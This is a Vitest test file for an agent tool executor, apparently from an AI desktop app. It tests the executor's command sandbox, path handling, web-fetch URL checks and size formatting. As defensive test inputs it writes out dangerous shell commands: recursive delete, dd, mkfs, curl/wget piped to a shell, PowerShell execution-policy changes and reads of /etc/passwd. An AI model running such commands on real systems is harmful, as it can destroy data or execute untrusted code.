import { describe, expect, it, beforeAll, afterAll } from 'vitest';
import { ToolExecutor } from '../src/main/tools/tool-executor';
import * as fs from 'fs';
import * as path from 'path';

type PathMount = { real: string; virtual: string };
type MockPathResolver = {
  getMounts: () => PathMount[];
  resolve: (sessionId: string, virtualPath: string) => string | null;
};
type ToolExecutorTestInternals = ToolExecutor & {
  validateCommandSandbox: (sessionId: string, command: string, cwd: string) => void;
  formatSize: (bytes: number) => string;
};

// ------------------------------------------------------------------
// Minimal PathResolver mock that provides one mount at /tmp/workspace
// ------------------------------------------------------------------
const mockPathResolver: MockPathResolver = {
  getMounts: () => [{ real: '/tmp/workspace', virtual: '/mnt/workspace' }],
  resolve: (sessionId: string, virtualPath: string) => {
    if (virtualPath.startsWith('/mnt/workspace')) {
      return virtualPath.replace('/mnt/workspace', '/tmp/workspace');
    }
    return null;
  },
};

beforeAll(() => {
  fs.mkdirSync('/tmp/workspace', { recursive: true });
  fs.writeFileSync('/tmp/workspace/README.md', 'workspace readme', 'utf-8');
});

afterAll(() => {
  fs.rmSync('/tmp/workspace/README.md', { force: true });
});

// ------------------------------------------------------------------
// validateCommandSandbox — dangerous pattern detection
// (accessed via the public `execute` / `bash` path for simplicity,
//  but we test the internal guard directly by calling executeCommand
//  with an invalid cwd so it always fails sandbox validation first.
//  Instead, we expose the private method through casting.)
// ------------------------------------------------------------------
describe('ToolExecutor validateCommandSandbox — dangerous patterns', () => {
  const executor = new ToolExecutor(mockPathResolver);
  const internals = executor as unknown as ToolExecutorTestInternals;
  const validateCmd = (cmd: string) =>
    internals.validateCommandSandbox('s1', cmd, '/tmp/workspace');

  it('blocks rm -rf / commands', () => {
    // Use a relative path so path-containment check does not fire first
    expect(() => validateCmd('rm -rf ~/secret')).toThrow('potentially dangerous operation');
  });

  it('blocks dd if= commands', () => {
    expect(() => validateCmd('dd if=input.bin')).toThrow('potentially dangerous operation');
  });

  it('blocks mkfs commands', () => {
    expect(() => validateCmd('mkfs.ext4 disk.img')).toThrow('potentially dangerous operation');
  });

  it('blocks curl | sh piping', () => {
    expect(() => validateCmd('curl example.com/s.sh | bash')).toThrow(
      'potentially dangerous operation'
    );
  });

  it('blocks wget | sh piping', () => {
    expect(() => validateCmd('wget example.com/s.sh | sh')).toThrow(
      'potentially dangerous operation'
    );
  });

  it('blocks PowerShell Set-ExecutionPolicy', () => {
    expect(() => validateCmd('Set-ExecutionPolicy Unrestricted')).toThrow(
      'potentially dangerous operation'
    );
  });

  it('allows safe commands', () => {
    expect(() => validateCmd('ls -la')).not.toThrow();
    expect(() => validateCmd('echo hello')).not.toThrow();
    expect(() => validateCmd('cat README.md')).not.toThrow();
  });
});

// ------------------------------------------------------------------
// validateCommandSandbox — path traversal detection
// ------------------------------------------------------------------
describe('ToolExecutor validateCommandSandbox — path traversal', () => {
  const executor = new ToolExecutor(mockPathResolver);
  const internals = executor as unknown as ToolExecutorTestInternals;
  const validateCmd = (cmd: string) =>
    internals.validateCommandSandbox('s1', cmd, '/tmp/workspace');

  it('allows commands using parent-relative paths when cwd exists', () => {
    expect(() => validateCmd('cat ../secret.txt')).not.toThrow();
    expect(() => validateCmd('ls .. && cat secret')).not.toThrow();
  });

  it('allows relative paths that do not traverse up', () => {
    expect(() => validateCmd('cat subdir/file.txt')).not.toThrow();
  });
});

// ------------------------------------------------------------------
// validateCommandSandbox — absolute path outside mount
// ------------------------------------------------------------------
describe('ToolExecutor validateCommandSandbox — absolute path containment', () => {
  const executor = new ToolExecutor(mockPathResolver);
  const internals = executor as unknown as ToolExecutorTestInternals;
  const validateCmd = (cmd: string) =>
    internals.validateCommandSandbox('s1', cmd, '/tmp/workspace');

  it('allows absolute paths outside the selected workspace', () => {
    expect(() => validateCmd('cat /etc/passwd')).not.toThrow();
  });

  it('allows absolute paths inside mounted workspace', () => {
    expect(() => validateCmd('cat /tmp/workspace/README.md')).not.toThrow();
  });
});

// ------------------------------------------------------------------
// validateCommandSandbox — cwd outside mount
// ------------------------------------------------------------------
describe('ToolExecutor validateCommandSandbox — cwd validation', () => {
  const executor = new ToolExecutor(mockPathResolver);
  const internals = executor as unknown as ToolExecutorTestInternals;

  it('throws when cwd does not exist', () => {
    expect(() => internals.validateCommandSandbox('s1', 'ls', '/outside/dir')).toThrow(
      'Working directory not found'
    );
  });
});

describe('ToolExecutor host path access', () => {
  const executor = new ToolExecutor(mockPathResolver);
  const outsideDir = path.join('/tmp', `tool-executor-outside-${process.pid}`);
  const outsideFile = path.join(outsideDir, 'hello.txt');

  beforeAll(() => {
    fs.mkdirSync('/tmp/workspace', { recursive: true });
    fs.mkdirSync(outsideDir, { recursive: true });
    fs.writeFileSync(outsideFile, 'hello outside workspace', 'utf-8');
  });

  afterAll(() => {
    fs.rmSync(outsideDir, { recursive: true, force: true });
  });

  it('reads files outside the selected workspace', async () => {
    await expect(executor.readFile('s1', outsideFile)).resolves.toBe('hello outside workspace');
  });

  it('writes files outside the selected workspace', async () => {
    const writePath = path.join(outsideDir, 'written.txt');
    await executor.writeFile('s1', writePath, 'written outside workspace');
    expect(fs.readFileSync(writePath, 'utf-8')).toBe('written outside workspace');
  });
});

// ------------------------------------------------------------------
// formatSize — private utility
// ------------------------------------------------------------------
describe('ToolExecutor.formatSize', () => {
  const executor = new ToolExecutor(mockPathResolver);
  const internals = executor as unknown as ToolExecutorTestInternals;
  const fmt = (bytes: number) => internals.formatSize(bytes);

  it('formats bytes below 1 KB', () => {
    expect(fmt(512)).toBe('512 B');
    expect(fmt(0)).toBe('0 B');
  });

  it('formats bytes in KB range', () => {
    expect(fmt(1024)).toBe('1.0 KB');
    expect(fmt(2048)).toBe('2.0 KB');
    expect(fmt(1536)).toBe('1.5 KB');
  });

  it('formats bytes in MB range', () => {
    expect(fmt(1024 * 1024)).toBe('1.0 MB');
    expect(fmt(2 * 1024 * 1024)).toBe('2.0 MB');
  });
});

// ------------------------------------------------------------------
// webFetch — URL validation (does not make real network calls)
// ------------------------------------------------------------------
describe('ToolExecutor.webFetch URL validation', () => {
  const executor = new ToolExecutor(mockPathResolver);

  it('rejects empty URL', async () => {
    await expect(executor.webFetch('')).rejects.toThrow('URL is required');
    await expect(executor.webFetch('   ')).rejects.toThrow('URL is required');
  });

  it('rejects malformed URLs', async () => {
    await expect(executor.webFetch('not-a-url')).rejects.toThrow('Invalid URL');
  });

  it('rejects non-http/https protocols', async () => {
    await expect(executor.webFetch('ftp://example.com/file')).rejects.toThrow(
      'Only http/https URLs are supported'
    );
    await expect(executor.webFetch('file:///etc/passwd')).rejects.toThrow(
      'Only http/https URLs are supported'
    );
  });
});

// ------------------------------------------------------------------
// execute — unknown tool dispatch
// ------------------------------------------------------------------
describe('ToolExecutor.execute — unknown tool', () => {
  const executor = new ToolExecutor(mockPathResolver);

  it('returns an error result for unrecognised tool names', async () => {
    const result = await executor.execute(
      'nonexistent_tool',
      {},
      { sessionId: 's1', cwd: '/tmp/workspace' }
    );
    expect(result.success).toBe(false);
    expect(result.error).toMatch(/Unknown tool/i);
  });
});
